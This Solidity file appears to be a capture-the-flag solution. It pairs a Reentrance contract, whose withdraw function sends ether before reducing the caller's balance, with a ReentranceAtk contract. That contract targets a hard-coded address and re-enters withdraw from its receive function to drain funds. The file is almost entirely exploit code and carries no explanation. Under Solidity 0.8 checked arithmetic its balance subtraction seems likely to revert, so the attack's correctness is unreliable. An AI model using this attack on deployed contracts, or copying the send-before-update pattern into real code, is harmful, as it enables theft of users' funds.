// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract ReentranceAtk {
    Reentrance public reentrance;

    constructor () {
        address payable contractAddress = payable(0x0c004c12De96C3C900D80b46d4F79E258779Fe13);
        reentrance  = Reentrance(contractAddress);
    }

    receive() external payable {
        reentrance.withdraw(1);
    }

    function attack() external payable {
        reentrance.donate{value:1}(address(this));
        reentrance.withdraw(1);
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}